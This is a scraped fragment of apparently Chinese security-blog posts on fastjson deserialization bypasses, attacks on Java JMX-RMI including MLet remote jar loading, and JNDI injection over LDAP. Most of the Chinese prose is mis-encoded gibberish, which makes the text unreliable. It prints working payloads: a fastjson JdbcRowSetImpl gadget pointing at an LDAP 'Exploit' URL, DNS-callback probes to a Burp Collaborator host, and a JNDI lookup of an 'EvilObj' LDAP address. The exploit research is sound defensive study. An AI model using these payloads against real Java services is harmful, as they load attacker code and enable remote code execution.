‰ªñË∞ÉÁî®‰∫ÜTypeUtils.loadClassÂáΩÊï∞ÔºåÂâçÈù¢Êàë‰ª¨ËÆ≤ËøáÔºå‰ªñÂ∞Ü‰ΩøÁî®ClassLoader.loadClassÊàñClass.forNameÊù•ËΩΩÂÖ•Á±ªÔºåÂú®Ëøô‰∏ÄËøáÁ®ã‰∏≠ÔºåÊ∂âÂèäÂà∞‰∫ÜmappingsÁöÑÊìç‰Ωú ËøôÈáåÁöÑcacheÈªòËÆ§‰∏∫trueÔºåÊâÄ‰ª•ËøôÈáå‰ºöÁõ¥Êé•Â∞ÜËΩΩÂÖ•ÂêéÁöÑÂØπË±°Â°´ÂÖ•mappings Ê†πÊçÆÊàë‰ª¨ÂâçÈù¢ÁöÑÂàÜÊûêÔºåÂ¶ÇÊûúÂΩìÂâçmappingsÈáåÂ≠òÂú®ÂèØÊéßÁöÑÁ±ªÔºåÈÇ£‰πà‰∏çÁÆ°ÂºÄÊ≤°ÂºÄÂêØAutoTypeÔºåÈÉΩ‰ºöËøõË°åÁ±ªËøòÂéüÔºõÂêåÊó∂Êàë‰ª¨Âà©Áî®Class.classÂèØ‰ª•ÂêëmappingsÂ°´ÂÖÖ‰ªªÊÑèÁ±ªÔºåËøôÂØºËá¥ÁªïËøá‰∫ÜÂâçÈù¢ÁöÑÊ£ÄÊµãÔºõ 12345678// ‰∏æ‰∏™‰æãÂ≠êjson = \"&#123;\" + // Áî®ClassËΩΩÂÖ•com.sun.rowset.JdbcRowSetImplÔºåÂπ∂ÁºìÂ≠òÂà∞mappings \"&#123;\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"&#125;,\" + // ÂêéÁª≠‰ΩøÁî®mappingsÈáåÁöÑcom.sun.rowset.JdbcRowSetImplÊù•ËøòÂéüÂØπË±° \"&#123;\\\"@type\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\",\" + \"\\\"dataSourceName\\\": \\\"ldap://localhost:1389/Exploit\\\",\" + \"\\\"autoCommit\\\": true&#125;\" + \"&#125;\"; ‰øÆÂ§çÂêéÁöÑÁâàÊú¨Âú®1.2.48ÁâàÊú¨‰∏äÂØπÂÖ∂ËøõË°å‰∫Ü‰øÆÂ§ç Âú®MiscCodecÂØπClassÁöÑÂ§ÑÁêÜ‰∏≠Ôºå‰øÆÊîπ‰∫Ücache=false Âπ∂‰∏îÂØπ‰∫éTypeUtils.loadClassÈáåÁöÑmappingsÊìç‰ΩúÈÉΩ‰æùËµñ‰∫écacheÔºåÂ¶ÇÊûú‰∏∫falseÂàô‰∏çÊ∑ªÂä†Âà∞mappingsÈáåÔºàÂú®ÂâçÈù¢ÁöÑÁâàÊú¨ÈáåClass.forNameÈÉ®ÂàÜÂπ∂‰∏ç‰æùËµñcacheÔºå48ÁâàÊú¨‰πãÂêéÂ¢ûÂä†‰∫ÜÂØπcacheÁöÑÂà§Êñ≠Ôºâ ‰∏éÊ≠§ÂêåÊó∂Ôºåjava.lang.Class‰πüË¢´Âä†ÂÖ•Âà∞‰∫ÜÈªëÂêçÂçïÈáåÈù¢ (5). ÂêéÁª≠ÁâàÊú¨ÂêéÁª≠ÁâàÊú¨ÁöÑÁªïËøá‰∏ªË¶ÅÂõ¥ÁªïÂú®Ôºö ÂºÄÂêØAutoTypeÔºåÁªïËøáÈªëÂêçÂçïÊ£ÄÊµã Âà©Áî®deserializersÈáåÈù¢ÁöÑÁ±ª(Ë∑üClass.class‰∏Ä‰∏™ÂéüÁêÜ) ÊúÄÊñ∞Áâà1.2.68ÂºïÂÖ•‰∫ÜsafeModeÔºåÂú®checkAutoTypeÈáåÊ∑ªÂä†‰∫Ü‰∏ãÈù¢Âà§Êñ≠ÔºåÂ¶ÇÊûúÂºÄÂêØ‰∫ÜsafemodeÔºåÈÇ£‰πàÂ∞Ü‰∏çÂÖÅËÆ∏ËøõË°å@type ‰∏çËøáËøô‰∏™Âπ∂‰∏çÊòØÈªòËÆ§ÂºÄÂêØÁöÑÔºåÈúÄË¶Å‰∫∫Â∑•ÂéªÈÖçÁΩÆ„ÄÇ (6). ÂêéÁª≠ÁâàÊú¨ËßâÂæóÊúâÊÑèÊÄùÁöÑÂà©Áî® fastjson &lt; 1.2.60 dos Fastjson-1-2-60-Dos ‰ΩøÁî®dnslogÊù•Ê£ÄÊµãfastjsonÊºèÊ¥û https://github.com/alibaba/fastjson/issues/3077 ËøôÈáåÁöÑÂéüÁêÜË∑üClass.classÊòØ‰∏ÄÊ†∑ÁöÑÔºåÂè™ÊòØÊç¢Êàê‰∫Üjava.net.URL„ÄÅjava.net.Inet4Address„ÄÅjava.net.Inet6AddressÔºåÁî±MiscCodecÂ§ÑÁêÜÊó∂‰ºöÂéªËß¶ÂèëdnsÊü•ËØ¢ ÂΩìÁÑ∂ËøôÈáåÁöÑËß¶ÂèëURLÁöÑËß¶ÂèëÁî®ÁöÑysoserialÈáåÈù¢ÁöÑURLDNSÁöÑÊñπÂºèÔºåÁî±hashcodeÂéªËß¶ÂèëÔºõ 123&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://s81twxdise25yxjinqaar74iq9wzko.burpcollaborator.net&quot;&#125;:&quot;aaa&quot;&#125; 0x04 ÊÄªÁªì Âà∞ËøôÈáåfastjsonÁõ∏ÂÖ≥ÁöÑÁü•ËØÜÁÇπÂ∞±Ê¢≥ÁêÜÁªìÊùü‰∫ÜÔºåËøôÂÖ∂‰∏≠ÂºÄÂèëËÄÖ‰∏éÂÆâÂÖ®Á†îÁ©∂‰∫∫ÂëòÁöÑÊîªÈò≤‰∫§‰∫íÁúüÊòØ‰ª§‰∫∫Áß∞Âø´ÔºÅÂêéÁª≠Â¶ÇÊûúÊúâÂÖ∂‰ªñÁöÑÁªïËøáÔºåËøò‰ºöÁªßÁª≠ÂÜô‰∏ãÂéª„ÄÇ ÊÄªÁªì‰∏Ä‰∏ãfastjsonÂà©Áî®‰∏≠ÁöÑÁâπËâ≤Ôºö ÂèçÂ∫èÂàóÂåñÊó∂‰∏ªÂä®Ëß¶ÂèëÁ¨¶ÂêàÊù°‰ª∂ÁöÑsettersÂíågettersÔºåÂÖ∂‰∏≠‰ΩøÁî®parseÂíåparseObjectÂáΩÊï∞ÔºåÂú®getterÂà©Áî®‰∏äparseObjectÁöÑÈôêÂà∂Êõ¥‰Ωé‰∏ÄÁÇπÔºõ‰ΩÜÊòØËøôÈáåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Êú¨ÊñáÁöÑ‰∏§ÁßçÊñπÊ≥ïÂ∞ÜparseÁöÑË∞ÉÁî®ÊïàÊûúËΩ¨Âåñ‰∏∫parseObject com.sun.org.apache.bcel.internal.util.ClassLoaderÊòØ‰∏™Â•Ω‰∏úË•ø fastjsonÁöÑÈªëÂêçÂçïÁªïËøáÊù•ÁúãÔºåÂü∫Êú¨‰∏äÊâæÁöÑÈÉΩÊòØjndiÁõ∏ÂÖ≥ÁöÑÂà©Áî®ÔºåÊàñËÆ∏ÂèØ‰ª•Êâ©Â±ï‰∏Ä‰∫õÂÖ∂‰ªñÁöÑÔºü ÊúâÊó∂ÂÄôÂºÄÂèëËÄÖÁêÜËß£‰∏çÂà∞‰ΩçÔºåÊâìÂæóË°•‰∏ÅÂèØ‰ª•ËΩªÊùæË¢´ÁªïËøáÔºåÊâÄ‰ª•ÈúÄË¶ÅÁ¥ßÁõØË°•‰∏ÅÁöÑÊÉÖÂÜµ"},{"title":"„Äênotes„ÄëÊîªÂáªJava JMX-RMI","permalink":"http://blog.0kami.cn/2020/03/10/java/java-jmx-rmi/","text":"0x00 ÂâçË®ÄRMIÁöÑ‰∏Ä‰∏™ÈáçË¶ÅÂ∫îÁî®ÊòØJMX(Java Management Extentions)ÔºåÊú¨Êñá‰ªãÁªçJMXÁöÑ‰∏§‰∏™ÊîªÂáªÈù¢ÔºöÔºâ 0x01 Âü∫Á°ÄÂú®ÂÜô‰∏ÄÂçäÁöÑÊó∂ÂÄôÔºåÂèëÁé∞‰∫ÜËøôÁØáÊñáÁ´†ÔºåÊÑüËßâÂÜôÁöÑÂæàÂ•ΩÔºåÂèØ‰ª•ÁúãÁúãÔºöhttps://mogwailabs.de/blog/2019/04/attacking-rmi-based-jmx-services/ JMX Java Management Extensions (JMX) is a Java technology that supplies tools for managing and monitoring applications, system objects, devices (such as printers) and service-oriented networks. MBean JMX allows you to manage resources as managed beans. A managed bean (MBean) is a Java Bean class that follows certain design rules of the JMX standard. An MBean can represent a device, an application, or any resource that needs to be managed over JMX. You can access these MBeans via JMX, query attributes and invoke Bean methods. The JMX standard differs between various MBean types however, we will only deal with the standard MBeans here. To be a valid MBean, a Java class must: Implement an interface Provide a default constructor (without any arguments) Follow certain naming conventions, for example implement getter/setter methods to read/write attributes ËøôÈáåÊèê‰∏Ä‰∏ãÔºåÂΩìMBeanÁöÑÂêçÂ≠ó‰∏∫HelloÊó∂ÔºåÂÖ∂Áõ∏Â∫îÁöÑinterfaceÂêçÂøÖÈ°ª‰∏∫HelloMBeanÔºå‰∏çÁÑ∂ÁÆó‰∏çÂêàÊ≥ïÁöÑMBean MBean Server A MBean server is a service that manages the MBeans of a system. Developers can register their MBeans in the server following a specific naming pattern. The MBean server will forward incoming messages to the registered MBeans. The service is also responsible to forward messages from MBeans to external components. DEMOÁî®ÂèÇËÄÉÈáåÁöÑÔºåÁî®jconsoleÁúãÁúãÁªìÊûú Âú®JConsoleÈáåÂèØ‰ª•ÂØπÂΩìÂâçÊ≥®ÂÜåÁöÑMBeanËøõË°åÊìç‰ΩúÔºåÂ¶Ç‰∏äÂõæË∞ÉÁî®sayHelloÂáΩÊï∞ ÂΩìÂâçÊàë‰ª¨ËøûÁöÑÊòØÊú¨Âú∞ÁöÑMBean Server(ÊØè‰∏™javaËøõÁ®ãÂú®Êú¨Âú∞ÈÉΩ‰ºöÊúâ‰∏Ä‰∏™MBean Server)ÔºåÊàë‰ª¨‰πüÂèØ‰ª•Â∞ÜMBean ServerÊåÇËΩΩÂà∞Êüê‰∏ÄÁ´ØÂè£‰∏äÔºåÊèê‰æõËøúÁ®ãÁöÑMBeanÁÆ°ÁêÜ„ÄÇ ËøêË°åjarÊó∂Â∏¶‰∏ä-Dcom.sun.management.jmxremote.port=2222 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false Áõ¥Êé•ÈÄöËøáJConsoleÊù•ËøûÊé•Ôºå‰ºöÊèêÁ§∫‰Ω†Êúâ‰∏§ÁßçÊñπÊ≥ï1:host:port;2:service:jmx:&lt;protocol&gt;:&lt;sap&gt; ËøôÈáåÊàë‰ª¨ÈáçÁÇπË¶ÅËÆ≤ÁöÑÂ∞±ÊòØÁ¨¨‰∫åÁßçÊñπÊ≥ïÔºåÈ¶ñÂÖàÊàë‰ª¨ÂÖàÊù•Áúã‰∏Ä‰∏ãjmxÂª∫Á´ãËµ∑2222Á´ØÂè£ÂêéÔºåÁî®nmapÊù•Ëé∑ÂèñÂÖ∂ÂÜÖÂÆπÊòØÊÄé‰πàÊ†∑ÁöÑ ‰ªéÁªìÊûúÊù•ÁúãÔºåJMXÁöÑMBean ServerÊòØÂª∫Á´ãÂú®RMIÁöÑÂü∫Á°Ä‰∏äÁöÑÔºåÂπ∂‰∏îÂÖ∂RMI RegistyÊ≥®ÂÜåÁöÑÂêçÂ≠óÂè´jmxrmi„ÄÇ Á¨¨‰∫åÁßçÊñπÊ≥ï‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÊåáÂÆöÂÖ∑‰ΩìÁöÑÂçèËÆÆÊù•Ë∑üServerÁ´ØËøõË°åËøûÊé•ÔºåÂèÇËÄÉJMX RMI connector API There are two forms for RMI connector addresses: In the JNDI form, the URL indicates where to find an RMI stub for the connector. This RMI stub is a Java object of type RMIServer that gives remote access to the connector server. With this address form, the RMI stub is obtained from an external directory entry included in the URL. An external directory is any directory recognized by JNDI, typically the RMI registry, LDAP, or COS Naming. In the encoded form, the URL directly includes the information needed to connect to the connector server. When using RMI/JRMP, the encoded form is the serialized RMI stub for the server object, encoded using BASE64 without embedded newlines. When using RMI/IIOP, the encoded form is the CORBA IOR for the server object. ËøôÈáåÁöÑencoded formÁöÑÂèçÂ∫èÂàóÂåñËøáÁ®ãÂÆûÂú®ÂèëËµ∑Á´ØËøõË°åÁöÑÔºåÊâÄ‰ª•ËøôÈáå‰∏çËÄÉËôëÁ¨¨‰∫åÁßçÂΩ¢Âºè„ÄÇ ÂØπ‰∫éJNDIÁöÑÂΩ¢ÂºèÔºåÊúâ‰ª•‰∏ãÂá†ÁßçÊñπÊ≥ïË∑üJMX ServerÂéªËøûÊé•Ôºö ConnectorÊîØÊåÅJRMPÂíåiiop‰Ωú‰∏∫ËøûÊé•Â±ÇÁöÑÂçèËÆÆÔºåÊâÄ‰ª•ÂØπÂ∫îÁöÑÊúâ‰∏§ÁßçÊñπÂºè 121. service:jmx:rmi://host:port/2. service:jmx:iiop://host:port/ Ê≠§Â§ñÔºåËøòÊúâÂü∫‰∫éÁõÆÂΩïÊù°ÁõÆÁöÑconnectors 12341. service:jmx:rmi://host:port/jndi/jndi-name2. service:jmx:iiop://host:port/jndi/jndi-nameÊØîÂ¶Çserivce:jmx:rmi://&lt;ÂèØÂøΩÁï•ÁöÑhost&gt;/jndi/rmi://host:port/jmxrmi ËøôÁßçÊñπÂºèÂ∞±ÂèØ‰ª•‰ΩøÁî®jndi‰∏ãÁöÑÊâÄÊúâspiÊù•ËøõË°åËøûÊé• 0x02 ÊîªÂáªJMX1. ÊîªÂáªJMX-RMICVE-2016-3427 Áî±‰∫éJMXËÆ§ËØÅÊó∂‰º†ÈÄíÁöÑÊòØHashMapÊï∞ÊçÆÁªìÊûÑÔºåËÄå‰ª•HashMapÂèØ‰ª•Áõ¥Êé•ÊûÑÈÄ†‰∏Ä‰∏™ÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊù•ÊîªÂáªÊú¨Âú∞ClassPathÔºåËøôÈáåÂ∑≤Áªè‰øÆÂ§ç‰∫Ü‰∏çÁªÜËÆ≤‰∫ÜXD ‰∏ªÂä®ÊîªÂáª1ÔºöÂà©Áî®RMI RegistyÊî∂Âà∞ËøúÁ®ãbindÊó∂‰∫ßÁîüÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥û jdk&lt;8u141_b10(Âπ∂‰∏îcheck hostÁöÑÈ°∫Â∫èÂèò‰∫ÜÔºåËØ¶ÁªÜÂèØ‰ª•ÁúãËøôÈáå)Ôºå8u141_b10‰øÆÊîπÂêéSingleEntryRegistryÂ¢ûÂä†‰∫Üfilter ÈôêÂà∂‰∫ÜÊé•ÂèóÂà∞ÁöÑ‰∏çËÉΩÊòØÂ∫èÂàóÂåñÂêéÁöÑÂØπË±°Ôºå‰πüÂ∞±ÊÑèÂë≥ÁùÄ‰∏çËÉΩÂà©Áî®registryËøôÁßçÊñπÂºèÊù•ËææÊàêÂà©Áî®‰∫Ü„ÄÇ ‰∏ªÂä®ÊîªÂáª2:Âà©Áî®RMI DGCÂÆûÁé∞Â≠òÂú®ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÂèØÂú®JEP 290‰πãÂâçÁöÑÁâàÊú¨ÊîªÂáªÊàêÂäü(‰ΩøÁî®ysoserialÁöÑJRMPClientÔºåÂàÜÊûê‰πüËßÅËøôÈáå0x08ÈÉ®ÂàÜ) ÂâçÈù¢‰∏§ÁßçÊñπÂºèÔºåÂú®ÊúÄÊñ∞ÁâàÁöÑJDK8‰∏≠ÂùáÊó©Â∑≤Â§±Êïà„ÄÇÈô§‰∫ÜÁõ¥Êé•ÊîªÂáªRMIÂ±ÇÔºåÊàë‰ª¨‰πüËøòÂèØ‰ª•Âà©Áî®MBean ServerÊåÇËΩΩÁöÑÂØπË±°ÂáΩÊï∞ÔºåÊù•‰º†ÈÄíÊûÑÈÄ†Â•ΩÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆ„ÄÇËøôÈáåÊúâÁÇπÂÉèRMI‰∏≠Âà©Áî®RMI ServerÊåÇËΩΩÁöÑÂØπË±°ÂáΩÊï∞ÂèÇÊï∞‰∏≠Â≠òÂú®Áõ∏ÂÖ≥ÂèØÂà©Áî®ÁöÑÂØπË±°ÔºåÂ¶ÇObjectÁ±ªÂûãÂ∞±ÂèØ‰ª•Ë£ÖËΩΩÊâÄÊúâÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆ„ÄÇ 2. ÊîªÂáªÂ≠òÂú®ÂáΩÊï∞ÂèÇÊï∞ÁöÑÂØπË±°Âà©Áî®MBean ServerÊåÇËΩΩÁöÑÂØπË±°ÂáΩÊï∞ÂèÇÊï∞ÔºåÊù•‰º†ÈÄíÊûÑÈÄ†Â•ΩÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆ„ÄÇMBean ServerÊé•Êî∂Âà∞Êï∞ÊçÆÂêéÔºå‰ºöÂØπËé∑ÂèñÂà∞ÁöÑÂèÇÊï∞Êï∞ÊçÆËøõË°åobject[]ËΩ¨Êç¢ÔºåÂú®ËΩ¨Êç¢ÂâçÔºåÈúÄË¶ÅÂ∞ÜRMI‰∫§‰∫íËøáÁ®ã‰∏≠ÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆËøõË°åÂèçÂ∫èÂàóÂåñ javax/management/remote/rmi/RMIConnectionImpl.java#unwrap 1583Ë°åËøõË°åÁ±ªÂûãËΩ¨ÂåñÔºå‰ΩÜÈ¶ñÂÖàÈúÄË¶ÅÂÖàËøõË°åÂèçÂ∫èÂàóÂåñmo.get() java/rmi/MarshalledObject.java#get ËøôÈáåÂ∞±Âà∞‰∫ÜÂ∏∏ËßÑÁöÑÂèçÂ∫èÂàóÂåñÊìç‰Ωú ÊâÄ‰ª•Âè™Ë¶ÅMBean ServerÈáåÂ≠òÂú®MBeanÁöÑÂáΩÊï∞Â≠òÂú®ÂèÇÊï∞ÔºåÊàë‰ª¨ÈÄöËøáÊûÑÈÄ†Áõ∏ÂÖ≥ÁöÑinvoke‰º†ÈÄíËøáÂéªÂ∞±ÂèØ‰ª•Ëß¶ÂèëÂèçÂ∫èÂàóÂåñ Â¶Çjava.util.logging.Logging#getLoggerLevel(String)Êúâ‰∏Ä‰∏™StringÁ±ªÂûãÁöÑÂáΩÊï∞ÂèÇÊï∞ÔºåËøôÈáåÊàë‰ª¨Áõ¥Êé•Â∞ÜpayloadÂ°ûËøõinvokeÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞Âç≥ÂèØ„ÄÇ ÂÖ∂‰ªñÁöÑMBean‰πüÂêåÊ†∑ÂèØ‰ª•ËøôÊ†∑Êìç‰ΩúÔºåËøôÈáåÂ¶ÇÊûúÈúÄË¶ÅËÆ§ËØÅÁöÑËØùÔºåÂ∞±ÈúÄË¶ÅÂú®ËøûÊé•Êó∂Â∞ÜËÆ§ËØÅ‰ø°ÊÅØÂ∏¶‰∏äÔºåÂêéÁª≠ÁöÑËøòÊòØÂèØ‰ª•Âà©Áî®ÊàêÂäüÁöÑ„ÄÇ 3. Âà©Áî®MLETÊñπÂºèÂä®ÊÄÅÂä†ËΩΩMBeanËøôÈáåÂÖàËØ¥Âà©Áî®ÊñπÂºèÔºö Âà©Áî®Êù°‰ª∂Ôºö Êó†security manager Êó†ËÆ§ËØÅ Âà©Áî®ÂéüÁêÜÔºö Âú®‰∏ÄHTTP ServerÊåÇËΩΩmletÊñá‰ª∂ÂíåÂåÖÂê´MBeanÁöÑjarÊñá‰ª∂ Áî®createMBean(&quot;javax.management.loading.MLet&quot;, null);ÁöÑÊñπÂºèÂú®ËøúÁ®ãJMXÂàõÂª∫MLetÂØπË±° ‰ΩøÁî®getMBeansFromURL‰ªéËøúÁ®ãHTTP ServerÂä†ËΩΩmletÊñá‰ª∂ Ëß£ÊûêmletÊñá‰ª∂ÔºåÁî±‰∫éÂ≠òÂú®codebaseÔºå‰ªéËøúÁ®ãÂä†ËΩΩjarÊñá‰ª∂ÔºåÂπ∂ËΩΩÂÖ•ËØ•MBean Ë∞ÉÁî®ËØ•MBeanÁöÑÊñπÊ≥ïÔºåËøô‰∏™ÊñπÊ≥ïÂèØ‰ª•ÊòØËá™ÂÆö‰πâÁöÑÊâßË°åÂëΩ‰ª§Á≠âÊìç‰Ωú ÁÆÄÂçïÂàÜÊûêÔºö Êù•ÁÆÄÂçïËØ¥‰∏Ä‰∏ãMLetÁöÑÂéüÁêÜÔºåJMXÈô§‰∫ÜÂä†ËΩΩÊú¨Âú∞ÁöÑMBeanÔºå‰πüÂèØ‰ª•Âä†ËΩΩËøúÁ®ãÁöÑMLetÊñá‰ª∂(ÂåÖÂê´‰∫ÜMLetÊ†áÁ≠æ)Êù•Âä®ÊÄÅÂä†ËΩΩcodebaseÈáåÁöÑJarÊñá‰ª∂„ÄÇÂêéËÄÖÂ∞±ÊòØÈÄöËøáMLetÂØπË±°ÁöÑgetMBeansFromURLÂáΩÊï∞Êù•ÂÆåÊàêÁöÑ„ÄÇ ÊúâÂÖ¥Ë∂£ÁöÑÂèØ‰ª•Áøª‰∏ÄÁøªjavax/management/loading/MLet.java#getMBeansFromURLÔºåËøôÈáåÁõ¥Êé•ËØ¥‰∏Ä‰∏ãÊµÅÁ®ã ‰ªéËøúÁ®ãÊúçÂä°Âô®Âä†ËΩΩMLetÊñá‰ª∂Âπ∂Ëß£ÊûêËØ•Êñá‰ª∂ Ê†πÊçÆMLetÊñá‰ª∂‰∏≠ÊåáÂÆöÁöÑcodebaseÂíåarchiveÂ≠óÊÆµÔºåÊãºÊé•ÊàêÊúÄÂêéË¶ÅËØ∑Ê±ÇÁöÑjarÊñá‰ª∂URLÂú∞ÂùÄ ÊúÄÂêéÁî±URLClassLoaderÊù•ÂÆåÊàêËØ∑Ê±ÇËΩΩÂÖ•Êìç‰Ωú ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÁ¨¨2Ê≠•‰∏≠ÔºåÂ¶ÇÊûúÂΩìÂâçÁöÑURLÂú∞ÂùÄÂ∑≤ÁªèÂ≠òÂú®Â∞Ü‰∏çÂÜçÈáçÊñ∞ÂèëËµ∑ËΩΩÂÖ•ËØ∑Ê±ÇÔºåÊÑèÂë≥ÁùÄ‰∏ÄÊ¨°ËΩΩÂÖ•ÊàêÂäü‰πãÂêéÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî®ËØ•MBeanÔºàServer‰∏çÈáçÂêØÁöÑÁä∂ÊÄÅ‰∏ãÔºâ„ÄÇ ËÄåÂØπ‰∫éÂâçÈù¢ÊèêÂà∞ÁöÑ‰∏§‰∏™Âà©Áî®Êù°‰ª∂Ôºö Âú®ÊñáÊ°£Èáåhttps://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.htmlÊèêÂà∞ Caution - This configuration is insecure: any remote user who knows (or guesses) your port number and host name will be able to monitor and control your Java applications and platform. Furthermore, possible harm is not limited to the operations you define in your MBeans. A remote client could create a javax.management.loading.MLet MBean and use it to create new MBeans from arbitrary URLs, at least if there is no security manager. In other words, a rogue remote client could make your Java application execute arbitrary code. Consequently, while disabling security might be acceptable for development, it is strongly recommended that you do not disable security for production systems. È¶ñÂÖàÂØπ‰∫éÊúâËÆ§ËØÅÁöÑÊÉÖÂÜµ‰∏ãÔºåË∞ÉÁî®MLetÂ∞Ü‰ºöËøõË°åÊùÉÂΩìÂâçÁî®Êà∑ÁöÑÊùÉÈôêÈ™åËØÅÔºåÈªòËÆ§ÊÉÖÂÜµ‰∏ãÈÉΩÊòØ‰∏çÂÖÅËÆ∏ÁöÑ„ÄÇ com/sun/jmx/remote/security/MBeanServerFileAccessController.java#checkAccess‰ºöÊ£ÄÊü•ÂΩìÂâçÁôªÈôÜÁöÑÁî®Êà∑ÊòØÂê¶ÊúâCreateÁöÑÊùÉÈôê(ËøôÈáåÁöÑÊùÉÈôêÊòØ‰∏ãÈù¢ÁöÑcreatePatternsÔºåÂÆÉÂÖÅËÆ∏ÂàõÂª∫ÊåáÂÆöÊ≠£ÂàôÁöÑÁ±ªÂûãÔºåËÄåÊàë‰ª¨ÈªòËÆ§ÊòØ‰∏∫Á©∫ÁöÑ)ÔºåËøôÈáåÈªòËÆ§‰ºöËøîÂõûfalseÔºå‰πüÂ∞±ÊÑèÂë≥ÁùÄÂÆÉ‰∏çÂÖÅËÆ∏‰ª•MLetÂØπË±°ÂàõÂª∫Êñ∞ÁöÑMBean ÂÖ∂Ê¨°ÂØπ‰∫ésecurity managerÁöÑÈôêÂà∂ÔºåÂú®ËøúÁ®ãËΩΩÂÖ•Ââç‰ºöÂà§Êñ≠ÊòØÂê¶Â≠òÂú®ËΩΩÂÖ•ÁöÑÊùÉÈôêÔºàËøôÈáåÊàëÊ≤°ÁúãÂà∞ÂÖ∂‰ªñÁöÑÂú∞ÊñπÂÅö‰∫ÜÂà§Êñ≠ÔºåÂèØËÉΩ‰∏çÊ≠¢ÂΩìÂâçËøô‰∏™‰ΩçÁΩÆÁöÑÈ™åËØÅÔºâ ÂΩìÂâçÊñπÊ≥ïÊØîËæÉÊñπ‰æøÁöÑÊòØÂèØ‰ª•ËΩΩÂÖ•‰ªªÊÑèÁöÑ‰ª£Á†ÅÊù•ÊâßË°åÔºå‰ΩÜÊòØÂà©Áî®Êù°‰ª∂ÊØîËæÉËãõÂàª„ÄÇ 0x03 ÊÄªÁªìÂØπ‰∫éJMXÁöÑÂà©Áî®‰∏ªË¶ÅÂà©Áî®ÁöÑÊòØÊú¨Âú∞Â≠òÂú®ÁöÑGadgetÔºåÂ¶ÇÊûúÊú¨Âú∞‰∏çÂ≠òÂú®GadgetÁöÑËØùÂ∞±Êó†Ê≥ïÂà©Áî®ÊàêÂäü„ÄÇÈô§ÈùûÊª°Ë∂≥JMX MLetÁöÑÂà©Áî®Êù°‰ª∂ÔºåÈÄöËøáÂä†ËΩΩcodebase‰∏äÁöÑJarÊñá‰ª∂Êù•ÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ Èô§Ê≠§‰πãÂ§ñÔºåÁî±‰∫éÊú¨Ë∫´JMXÁî®ÁöÑRMIÈÇ£‰∏ÄÂ•ó‰∏úË•øÔºåÊâÄ‰ª•Â¶ÇÊûúÂú®ÂêàÈÄÇÁöÑJDKÁâàÊú¨‰∏ãÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÊîªÂáªRMIÔºå‰∏çËøáÂâçÊèê‰ªçÁÑ∂ÊòØÊú¨Âú∞Â≠òÂú®Áõ∏ÂÖ≥ÁöÑÂà©Áî®Èìæ„ÄÇ ÊúÄÂêéÔºåÂâçÊñáÊèêÂà∞ÁöÑÊîªÂáªÊñπÊ≥ïÊàëÂ∑≤ÁªèÂêåÊ≠•Âà∞github‰∏ä‰∫Ü"},{"title":"„Äênotes„ÄëJNDI with LDAP","permalink":"http://blog.0kami.cn/2020/03/01/java/jndi-with-ldap/","text":"0x00 ÂâçË®ÄJNDIÁöÑSPIÂ±ÇÈô§‰∫ÜRMIÂ§ñÔºåËøòÂèØ‰ª•Ë∑üLDAP‰∫§‰∫í„ÄÇ‰∏éRMIÁ±ª‰ººÔºåLDAP‰πüËÉΩÂêåÊ†∑ËøîÂõû‰∏Ä‰∏™ReferenceÁªôJNDIÁöÑNaming ManagerÔºåÊú¨ÊñáÂ∞ÜËÆ≤Ëø∞JNDI‰ΩøÁî®ldapÂçèËÆÆÁöÑ‰∏§‰∏™ÊîªÂáªÈù¢XD 0x01 LDAPÂü∫Á°ÄÂÖ≥‰∫éLDAPÁöÑ‰ªãÁªçÔºåÂª∂‰º∏ÈòÖËØª‰∏Ä‰∏ãËøôÁØá LDAP can be used to store Java objects by using several special Java attributes. There are at least two ways a Java object can be represented in an LDAP directory: ‚óè Using Java serialization o https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html‚óè Using JNDI References o https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html from https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf Java‰∏≠ÁöÑLDAPÂèØ‰ª•Âú®Â±ûÊÄßÂÄº‰∏≠Â≠òÂÇ®Áõ∏ÂÖ≥ÁöÑJavaÂØπË±°ÔºåÂèØ‰ª•Â≠òÂÇ®Â¶Ç‰∏ä‰∏§ÁßçÂØπË±°ÔºåËÄåÁõ∏ÂÖ≥ÁöÑÈóÆÈ¢òÂ∞±ÊòØÂá∫Áé∞Âú®ËøôÈÉ®ÂàÜ‰∏ä„ÄÇ ÂêéÊñáÁî®ÁöÑLDAP ServerÂèÇËÄÉÁöÑÊòØmbechler ÂÆûÁé∞ÁöÑLDAPRefServerÔºåËøûÊé•ÁöÑÂÆ¢Êà∑Á´ØClientÁõ¥Êé•Áî®JNDIÁöÑlookupÂÆåÊàêÔºåjdkÁâàÊú¨jdk8u162 123Context ctx = new InitialContext();ctx.lookup(\"ldap://127.0.0.1:1389/EvilObj\");ctx.close(); 0x02 LDAP with JDNI 